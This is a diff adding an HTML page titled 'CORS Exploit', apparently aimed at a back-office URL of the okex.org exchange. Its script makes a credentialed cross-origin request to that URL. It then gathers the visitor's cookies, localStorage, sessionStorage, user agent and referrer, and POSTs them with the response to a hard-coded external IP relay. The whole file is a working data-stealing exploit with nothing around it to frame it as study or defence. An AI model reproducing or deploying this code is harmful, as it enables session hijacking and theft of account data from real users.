@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Retrieve local storage and session storage data
+                var localStorageData = JSON.stringify(localStorage);
+                var sessionStorageData = JSON.stringify(sessionStorage);
+
+                // Retrieve cookies
+                var cookies = document.cookie;
+
+                // Create an object to hold the browser headers we can access
+                var headers = {
+                    'User-Agent': navigator.userAgent,
+                    'Referer': document.referrer,
+                    'Cookies': cookies
+                };
+
+                // Send the response, local storage/session storage data, and headers to the proxy server
+                fetch('http://139.180.206.59:3000/relay', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        targetUrl: 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297',
+                        headers: headers,
+                        localStorageData: localStorageData,
+                        sessionStorageData: sessionStorageData,
+                        response: xhr.responseText
+                    })
+                });
+            }
+        };
+        xhr.open('GET', 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297', true);
+        xhr.withCredentials = true; // Include cookies in the request if needed
+        xhr.send();
+    </script>
+</body>
+</html>
